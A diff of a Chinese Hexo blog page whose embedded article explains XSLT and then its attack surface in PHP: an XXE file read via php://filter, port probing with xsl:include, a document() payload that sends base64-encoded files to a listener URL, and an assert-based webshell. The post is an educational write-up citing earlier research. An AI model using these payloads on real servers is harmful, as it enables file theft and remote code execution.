@@ -1,106 +1,24 @@
+
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh">
-<head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
-
-
-
-
-  
-  
-  
-  
-
-  
+<html lang="zh-cn">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hexo">
+    <title>认识xslt - Hexo</title>
+    <meta name="author" content="John Doe">
     
     
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
-    
-    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
-  
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
-
-<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
-
-
-  <meta name="keywords" content="Hexo, NexT">
-
-
-
-
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">
-
-
-
-
-
-
-<meta name="description" content="什么是XSLT可扩展样式表语言转换(XSLT)是一种基于XML的语言，和专门的处理软件一起使用，用于XML文档转换。虽然这个处理过程被称作“转换”，但并没有改变原始文档，而是在原文档内容的基础上创建了一个新的XML文档。然后, 这个新文档会被处理器序列化（输出）为标准的XML语法或其他格式，如HTML或纯文本。XSLT最常用于不同XML模式间的数据转换，或用于将XML数据转换为网页或PDF文档 就">
-<meta property="og:type" content="article">
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"什么是XSLT可扩展样式表语言转换(XSLT)是一种基于XML的语言，和专门的处理软件一起使用，用于XML文档转换。虽然这个处理过程被称作“转换”，但并没有改变原始文档，而是在原文档内容的基础上创建了一个新的XML文档。然后, 这个新文档会被处理器序列化（输出）为标准的XML语法或其他格式，如HTML或纯文本。XSLT最常用于不同XML模式间的数据转换，或用于将XML数据转换为网页或PDF文档\n就是说XSLT 可以把 XML文档转换为其他类型的文档\n举个栗子1.xml写入\n123456&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;?xml-stylesheet type=\"text/xsl\" href=\"1.xsl\"?&gt;&lt;root&gt;    &lt;country&gt;China&lt;/country&gt;    &lt;company&gt;abc&lt;/company&gt;&lt;/root&gt;\n\n1.xsl写入\n12345678910111213141516171819202122232425&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:template match=\"/\"&gt;  &lt;html&gt;  &lt;body&gt;    &lt;h2&gt;My address&lt;/h2&gt;    &lt;table border=\"1\"&gt;    &lt;tr bgcolor=\"#9acd32\"&gt;      &lt;th align=\"left\"&gt;country&lt;/th&gt;      &lt;th align=\"left\"&gt;company&lt;/th&gt;    &lt;/tr&gt;    &lt;xsl:for-each select=\"root\"&gt;    &lt;tr&gt;      &lt;td&gt;&lt;xsl:value-of select=\"country\"/&gt;&lt;/td&gt;      &lt;td&gt;&lt;xsl:value-of select=\"company\"/&gt;&lt;/td&gt;    &lt;/tr&gt;    &lt;/xsl:for-each&gt;    &lt;/table&gt;  &lt;/body&gt;  &lt;/html&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;\n\n解释一下\n&lt;xsl:for-each&gt;  选取指定节点的集中的每个元素\n1&lt;xsl:for-each select=\"root\"&gt;  &lt;/xsl:for-each&gt;  这里选取xml文档中 root节点\n\n&lt;xsl:value-of&gt;  用于提取某个选定节点的值，并把值添加到转换的输出流中\n1&lt;xsl:value-of select=&quot;country&quot;/&gt; 这里的country对应的就是xml文档中&lt;country&gt;China&lt;/country&gt; 这个元素\n\n结果\n\n进一步上面只使用了xml xsl两种文件来进行转换，但是有的时候，同一个xml文档，在一个地方可能被要求转换，在另一个地方不要求转换，这就需要动态的来调用\nphp中可以使用XSLTProcessor 这个类来进行转换\n1.php写入\n12345678910111213&lt;?php   $xslDoc = new DOMDocument();   $xslDoc-&gt;load(\"1.xsl\");   $xmlDoc = new DOMDocument();   $xmlDoc-&gt;load(\"1.xml\");   $proc = new XSLTProcessor();   $proc-&gt;importStylesheet($xslDoc);   echo $proc-&gt;transformToXML($xmlDoc);?&gt;\n\n解释一下代码\nXSLTProcessor 是php中一个用来转换xml文档的类，适用于把一个xml文档转换成另一个类型的xml文档\nimportStylesheet 是XSLTProcessor类的一个方法，用来导入xslt样式表\ntransformToXML 也是XSLTProcessor类的一个方法，适用importStylesheet方法导入的xslt样式表转换xml文档\n访问一下1.php\n\n和上面一样的结果，把文件名改成参数，就可以更加方便的调用，\n12345678910111213&lt;?php   $xslDoc = new DOMDocument();   $xslDoc-&gt;load($_GET[&apos;xsl&apos;]);   $xmlDoc = new DOMDocument();   $xmlDoc-&gt;load($_GET[&apos;xml&apos;]);   $proc = new XSLTProcessor();   $proc-&gt;importStylesheet($xslDoc);   echo $proc-&gt;transformToXML($xmlDoc);?&gt;\n\n安全问题xxe读文件 \n类似于传统的xml xslt同样存在这个问题\n12345678910&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY shit SYSTEM \"php://filter/read=convert.base64-encode/resource=1.php\"&gt;   ]&gt;&lt;xsl:stylesheet version=\"1.0\"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:template match=\"/root\"&gt;  &amp;shit;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;\n\n结果\n\nxsl:includexslt文档中这么介绍xsl:include\nxsl:include 元素是顶层元素（top-level element），把一个样式表中的样式表内容包含到另一个样式表中\n1&lt;xsl:include href=&quot;URI&quot;/&gt;\n\n文档内还写明 该元素必须是 &lt;xsl:stylesheet&gt; 或 &lt;xsl:transform&gt; 的子节点。\n测试一下\n端口探测1.xsl写入\n123456&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;xsl:stylesheet version=\"1.0\"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:include href=\"http://127.0.0.1:9999/\" /&gt;&lt;/xsl:stylesheet&gt;\n\n1.php写入\n123456789&lt;?php   $xslDoc = new DOMDocument();   $xslDoc-&gt;load('1.xsl',LIBXML_NOENT);   $xmlDoc = new DOMDocument();   $xmlDoc-&gt;load('1.xml');   $proc = new XSLTProcessor();   $proc-&gt;importStylesheet($xslDoc);   echo $proc-&gt;transformToXML($xmlDoc);?&gt;\n\n结果\n\n读文件1.xsl写入\n123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot;xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;&lt;xsl:include href=&quot;php://filter/read=convert.base64-encode/resource=1.php&quot; /&gt;&lt;/xsl:stylesheet&gt;\n\n这里由于转换的问题 transformToXML 导致报错只出现了一行内容\n\n注意   php默认适用的是libxml libxml2.6版本以后默认禁止了外部实体导入，但是可以使用LIBXML_NOENT这个选项加载外部实体\n得找一个办法来解决报错只显示一行内容的问题\nno.1  再找一下有没有其他的可以导入外部文档的功能\nno.2 利用include可以包含url的特点，外带数据 \n在xslt中还找到一个document，可以用来访问外部文档\ndocumentdocument() 函数用于访问外部 XML 文档中的节点 这也就是说 它可以导入外部文件\n12345document(object,node-set)object 必需。定义外部 XML 文档的URI。node-set 可选。用于解析相对 URI。&lt;xsl:value-of select=&quot;document(&apos;1.xml&apos;)&quot;/&gt;\n\n读文件这里看到sky师傅用了一个连接加外带的方式 把数据传出来\n12345678&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;xsl:stylesheet version=\"1.0\"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:variable name=\"name1\" select=\"document('php://filter/read=convert.base64-encode/resource=2.php')\" /&gt;&lt;xsl:variable name=\"name2\" select=\"concat('http://127.0.0.1:9999/?a=', $name1)\" /&gt;&lt;xsl:variable name=\"name3\" select=\"document($name2)\" /&gt;&lt;/xsl:stylesheet&gt;\n\nconcat把两个字符串连接起来 最后在调用document 向外发送数据 本地监听9999端口，拿到数据\n探测端口1.xsl写入\n1234567891011121314151617181920212223242526&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:template match=\"/\"&gt;  &lt;html&gt;  &lt;body&gt;    &lt;h2&gt;My address&lt;/h2&gt;    &lt;table border=\"1\"&gt;    &lt;tr bgcolor=\"#9acd32\"&gt;      &lt;th align=\"left\"&gt;country&lt;/th&gt;      &lt;th align=\"left\"&gt;company&lt;/th&gt;    &lt;/tr&gt;    &lt;xsl:for-each select=\"root\"&gt;    &lt;tr&gt;      &lt;td&gt;&lt;xsl:value-of select=\"country\"/&gt;&lt;/td&gt;      &lt;td&gt;&lt;xsl:value-of select=\"company\"/&gt;&lt;/td&gt;      &lt;xsl:value-of select=\"document('http://127.0.0.1:9999')\"/&gt;    &lt;/tr&gt;    &lt;/xsl:for-each&gt;    &lt;/table&gt;  &lt;/body&gt;  &lt;/html&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;\n\n访问一下1.php\n\n并且这里不需要开启外部实体\n解析一句话test.php写入\n123456789101112131415&lt;?php$xml='&lt;root&gt;assert($_POST[asd]);&lt;/root&gt;';$xsl='&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:qwe=\"http://php.net/xsl\"&gt;  &lt;xsl:template match=\"/root\"&gt;    &lt;xsl:value-of select=\"qwe:function(\\'assert\\',string(.))\"/&gt; &lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;';$xmldoc = DOMDocument::loadXML($xml);$xsldoc = DOMDocument::loadXML($xsl);$proc = new XSLTProcessor();$proc-&gt;registerPHPFunctions();$proc-&gt;importStyleSheet($xsldoc);$proc-&gt;transformToXML($xmldoc);?&gt;\n\n解释一下上面的代码\n$xml=&#39;&lt;root&gt;assert($_POST[asd]);&lt;/root&gt;&#39;; 定义了一个xml元素\nxmlns:qwe=&quot;http://php.net/xsl&quot; 导入命令空间 这里导入的是php函数\n&lt;xsl:value-of select=&quot;qwe:function(\\&#39;assert\\&#39;,string(.))&quot;/&gt; 这里表示将匹配到的内容，作为参数，传给assert函数\n&lt;xsl:template match=”/root”&gt; 这里将匹配root节点的内容，assert($_POST[asd]);  下面的xsl:value-of会提取匹配到的内容，然后交给了后面的函数来执行 最终导致了一句话被解析\n结果\n\n参考链接\nhttps://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/#XSLT\nhttps://paper.seebug.org/36/#xsltwebshell\n","dateCreated":"2019-11-18T19:39:36+08:00","dateModified":"2019-11-19T11:11:37+08:00","datePublished":"2019-11-18T19:39:36+08:00","description":"","headline":"认识xslt","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/11/18/认识xslt/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://yoursite.com/2019/11/18/认识xslt/"}</script>
+    <meta name="description" content="什么是XSLT可扩展样式表语言转换(XSLT)是一种基于XML的语言，和专门的处理软件一起使用，用于XML文档转换。虽然这个处理过程被称作“转换”，但并没有改变原始文档，而是在原文档内容的基础上创建了一个新的XML文档。然后, 这个新文档会被处理器序列化（输出）为标准的XML语法或其他格式，如HTML或纯文本。XSLT最常用于不同XML模式间的数据转换，或用于将XML数据转换为网页或PDF文档 就">
+<meta property="og:type" content="blog">
 <meta property="og:title" content="认识xslt">
 <meta property="og:url" content="http://yoursite.com/2019/11/18/认识xslt/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="什么是XSLT可扩展样式表语言转换(XSLT)是一种基于XML的语言，和专门的处理软件一起使用，用于XML文档转换。虽然这个处理过程被称作“转换”，但并没有改变原始文档，而是在原文档内容的基础上创建了一个新的XML文档。然后, 这个新文档会被处理器序列化（输出）为标准的XML语法或其他格式，如HTML或纯文本。XSLT最常用于不同XML模式间的数据转换，或用于将XML数据转换为网页或PDF文档 就">
-<meta property="og:locale" content="zh">
+<meta property="og:locale" content="zh-cn">
 <meta property="og:image" content="data:image/png;base64,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">
